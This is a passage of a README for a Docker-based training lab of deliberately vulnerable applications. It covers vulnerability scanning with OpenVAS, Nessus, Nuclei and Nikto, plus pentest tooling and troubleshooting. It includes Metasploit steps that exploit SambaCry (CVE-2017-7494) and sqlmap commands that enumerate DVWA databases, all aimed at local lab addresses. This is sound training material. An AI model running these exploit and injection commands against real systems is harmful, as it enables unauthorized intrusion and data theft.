> **Important:** The network name may vary depending on the directory. Use `docker network ls` to check the exact name (usually `<folder>_vulnnet`).

#### Step 3: Get Target IPs

```bash
# List IPs of all VulnLab containers
./lab.sh ips

# Export to file
./lab.sh export-targets
cat targets.txt

# Example output:
# 172.30.1.1    metasploitable2
# 172.30.7.1    juice-shop
# 172.30.9.1    dvwa
# ...
```

#### Step 4: Access the OpenVAS Web Interface

1. Open your browser and go to: **https://localhost:8080**

2. Accept the self-signed certificate (security warning)

3. Log in:
   - **Username:** `admin`
   - **Password:** The password you set in Step 1

#### Step 5: Create a Target

1. In the top menu, go to: **Configuration → Targets**

2. Click the **⭐ (New Target)** icon in the upper left corner

3. Fill in the fields:
   - **Name:** `VulnLab-WebApps` (or a descriptive name)
   - **Hosts - Manual:** Paste the target IPs, separated by commas:
     ```
     172.30.9.1, 172.30.7.1, 172.30.8.1, 172.30.9.2, 172.30.9.3
     ```
     Or to scan the entire network:
     ```
     172.30.0.0/16
     ```
   - **Port List:** Select `All TCP and Nmap top 100 UDP`

4. Click **Save**

#### Step 6: Create and Run a Task (Scan)

1. In the top menu, go to: **Scans → Tasks**

2. Click the **⭐ (New Task)** icon in the upper left corner

3. Fill in the fields:
   - **Name:** `Scan-VulnLab`
   - **Scan Targets:** Select the created target (`VulnLab-WebApps`)
   - **Scanner:** `OpenVAS Default`
   - **Scan Config:**
     - `Full and fast` - For a quick scan (~30 min for a few hosts)
     - `Full and deep` - For a full scan (~2-4 hours)

4. Click **Save**

5. In the task list, click the **▶ (Start)** icon to start the scan

#### Step 7: Monitor and View Results

1. **Monitor progress:**
   - Go to **Scans → Tasks**
   - The **Status** column shows the progress (%)
   - Click the task name for details

2. **View found vulnerabilities:**
   - Go to **Scans → Results**
   - Filter by severity: High, Medium, Low

3. **Generate a report:**
   - Go to **Scans → Reports**
   - Click the desired report
   - Click the **⬇ Download** icon and choose the format (PDF, HTML, CSV, XML)

#### Complete Example: Scanning Web Apps

```bash
# 1. Make sure VulnLab is running
./lab.sh start dvwa juice-shop webgoat bwapp

# 2. Check the IPs
./lab.sh ips | grep -E "dvwa|juice|webgoat|bwapp"
# 172.30.9.1    dvwa
# 172.30.7.1    juice-shop
# 172.30.8.1    webgoat
# 172.30.9.2    bwapp

# 3. Start OpenVAS (if not running)
docker start openvas

# 4. Connect to the network (if not already connected)
docker network connect trabalho_vulnnet openvas

# 5. Access https://localhost:8080 and create:
#    - Target: "WebApps" with hosts: 172.30.9.1, 172.30.7.1, 172.30.8.1, 172.30.9.2
#    - Task: "Scan-WebApps" with "Full and fast" config
#    - Start the scan and wait for the results
```

#### Useful Commands

```bash
# Stop OpenVAS
docker stop openvas

# Start OpenVAS again
docker start openvas

# View OpenVAS logs
docker logs -f openvas

# Remove OpenVAS (keeps data in volume)
docker rm openvas

# Remove everything (including data)
docker rm openvas
docker volume rm openvas

# Update vulnerability definitions
docker exec -it openvas greenbone-feed-sync
```

#### Recommended Scans by Category

| Category | Hosts (for Target) | Scan Config | Estimated Time |
|---|---|---|---|
| **Web Apps** | `172.30.7.1, 172.30.8.1, 172.30.9.1, 172.30.9.2, 172.30.9.3` | Full and fast | 30-60 min |
| **Databases** | `172.30.14.1, 172.30.14.2, 172.30.14.3, 172.30.14.4` | Full and fast | 20-40 min |
| **Critical CVEs** | `172.30.3.1, 172.30.4.1, 172.30.6.3, 172.30.6.4` | Full and deep | 30-60 min |
| **Full Network** | `172.30.0.0/16` | Discovery | 1-2 hours |

---

### Other Scanners

#### Nessus

```bash
# Import targets
./lab.sh export-targets

# Via CLI (if available)
nessuscli scan --targets targets.txt --policy "Basic Network Scan"

# Via API
curl -k -X POST "https://localhost:8834/scans" \
  -H "X-ApiKeys: accessKey=xxx;secretKey=yyy" \
  -d '{"uuid":"template-uuid","settings":{"name":"VulnLab","text_targets":"'$(cat targets.txt)'"}}'
```

#### Nuclei

```bash
# Basic scan with CVE templates
nuclei -l targets.txt -t cves/ -o nuclei-results.txt

# Full scan
nuclei -l targets.txt -t cves/,vulnerabilities/,misconfiguration/ -severity critical,high

# Specific scan for web apps
echo "http://127.0.0.1:8005
http://127.0.0.1:3000
http://127.0.0.1:8003" > web-urls.txt

nuclei -l web-urls.txt -t http/cves/,http/vulnerabilities/ -o web-vulns.txt
```

#### Nikto

```bash
# Scan a specific web application
nikto -h 127.0.0.1 -p 8005 -o dvwa-nikto.html -Format html

# Scan multiple ports
nikto -h 127.0.0.1 -p 8005,3000,8003,8001 -o web-nikto.txt

# Scan with specific tuning
nikto -h http://127.0.0.1:8005 -Tuning 9 -o sqli-xss-scan.txt
```

---

### Pentest Tools

#### Metasploit Framework

```bash
# Start Metasploit with database
msfdb init
msfconsole -q

# Inside msfconsole:
# Configure workspace
workspace -a vulnlab

# Network scan
db_nmap -sV -sC 172.30.0.0/16 -oA vulnlab-nmap

# List discovered hosts
hosts

# List services
services

# Search for known vulnerabilities
vulns

# Example: exploit SambaCry (CVE-2017-7494)
use exploit/linux/samba/is_known_pipename
set RHOSTS 172.30.4.1
set RPORT 445
exploit
```

#### SQLMap

```bash
# DVWA - SQL Injection (requires login first)
# 1. Log in to DVWA and get the PHPSESSID cookie
# 2. Set security level to "low"

sqlmap -u "http://127.0.0.1:8005/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123;security=low" \
  --dbs

# Enumerate tables
sqlmap -u "http://127.0.0.1:8005/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=abc123;security=low" \
  -D dvwa --tables

# SQLi Labs
sqlmap -u "http://127.0.0.1:8110/Less-1/?id=1" --dbs --batch
```

#### Burp Suite

```text
1. Configure proxy: 127.0.0.1:8080
2. Add to scope:
   - http://127.0.0.1:8005 (DVWA)
   - http://127.0.0.1:3000 (Juice Shop)
   - http://127.0.0.1:8003 (WebGoat)
3. Browse the applications to capture requests
4. Use Intruder for fuzzing and Scanner for automatic detection
```

---

## Troubleshooting

### Error: "YAML syntax error"

```bash
# Validate syntax
docker-compose config

# If there is an error, check indentation
python3 -c "import yaml; yaml.safe_load(open('docker-compose.yml'))"
```

### Error: "ContainerConfig KeyError"

```bash
# Remove corrupted containers
docker rm -f $(docker ps -aq)

# Restart
./lab.sh start dvwa juice-shop
```

### Error: "Port already in use"

```bash
# Check the process using the port
sudo lsof -i :8005

# Or with netstat
sudo netstat -tlnp | grep 8005

# Stop the conflicting process or change the port in docker-compose.yml
```

### Error: "No space left on device"

```bash
# Clean up unused images
docker system prune -a

# Clean up volumes
docker volume prune

# Check disk usage
docker system df
```

### Performance: Slow containers

```bash
# Check resource usage
./lab.sh stats

# Limit resources in docker-compose.yml
# deploy:
#   resources:
#     limits:
#       memory: 512M
```

---

## Contributing

### How to Contribute

1. Fork the repository
2. Create a branch: `git checkout -b feature/new-vulnerability`
3. Commit your changes: `git commit -m 'Add: new vulnerable container'`
4. Push to the branch: `git push origin feature/new-vulnerability`
5. Open a Pull Request

### Guidelines

- Keep binding to `127.0.0.1` for all exposed ports
- Document known CVEs and vulnerabilities
- Include default credentials in the documentation
- Test with `docker-compose config` before committing

---

## Disclaimer

> **ATTENTION: FOR EDUCATIONAL USE ONLY**
>
> This lab contains **severely vulnerable applications** that **SHOULD NOT** be exposed to public or untrusted networks.
>
> **Permitted use:**
> - Isolated lab environments
> - Private networks for training
> - Authorized security research
> - Development of defensive tools
>
> **Prohibited use:**
> - Exposure to the internet
> - Testing on unauthorized systems
> - Malicious activities
>
> The maintainers **ARE NOT RESPONSIBLE** for any misuse of this material.

---

## License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

---

## References

- [OWASP Top 10](https://owasp.org/Top10/)
- [CVE Database](https://cve.mitre.org/)
- [Exploit Database](https://www.exploit-db.com/)
- [Docker Security](https://docs.docker.com/engine/security/)
- [NIST NVD](https://nvd.nist.gov/)

---

**Maintained by:** [Cristhian Kapelinski](https://github.com/CristhianKapelinski)